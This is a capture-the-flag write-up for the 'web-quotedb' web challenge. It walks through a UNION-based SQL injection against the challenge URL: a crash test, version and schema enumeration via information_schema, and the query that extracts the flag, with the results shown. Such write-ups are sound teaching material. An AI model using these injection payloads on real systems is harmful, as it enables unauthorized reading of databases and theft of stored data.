## Brief

You don’t manage to disarm the guard, he is quicker than you are. He knocks you out, and when you wake up you’re inside a prison cell, but it doesn’t seem like you’re on a boat anymore, you must be inside the headquarters on the secret island! The cell is claustrophobic, with rusty iron bars and a bed of concrete.

Challenge: web-quotedb (web)
In this challenge, you have to find the hidden flag. Good luck !

## Link

https://quotedb-web.2021.ctfcompetition.com/
https://quotedb-web.2021.ctfcompetition.com/

## Solve

Web challenge, probably a SQLi

Indeed, we can make the page crash with `https://quotedb-web.2021.ctfcompetition.com/?id='`

We fuzz a little bit to find a working injection and we get :

`?id=111 UNION ALL SELECT NULL,VERSION(),NULL` -> "10.6.4-MariaDB-1:10.6.4+maria~focal" 

DATABASE() -> quotedb

`https://quotedb-web.2021.ctfcompetition.com/?id=111 UNION ALL SELECT NULL, CONCAT(id, quote), NULL from quotes`

`https://quotedb-web.2021.ctfcompetition.com/?id=111%20UNION%20ALL%20SELECT%20NULL,%20GROUP_CONCAT(schema_name),%20NULL%20FROM%20information_schema.schemata`

`information_schema,sys,quotedb,performance_schema,mysql`

`wget 'https://quotedb-web.2021.ctfcompetition.com/?id=111 UNION ALL SELECT NULL, GROUP_CONCAT(table_schema, table_name, column_name), NULL FROM information_schema.columns' -O table_enum`

`cat table_enum| tr ',' '\n' > enum_tables`

`cat enum_tables| grep quotedb`           

quotedbflagid
quotedbflagflag
quotedbquotesid
quotedbquotesquote
quotedbquotessource

`https://quotedb-web.2021.ctfcompetition.com/?id=111%20UNION%20ALL%20SELECT%20NULL,%20GROUP_CONCAT(id,%20flag),%20NULL%20FROM%20flag`

`"1CTF{little_bobby_tables_we_call_him}" -` 

Flag is `CTF{little_bobby_tables_we_call_him}`
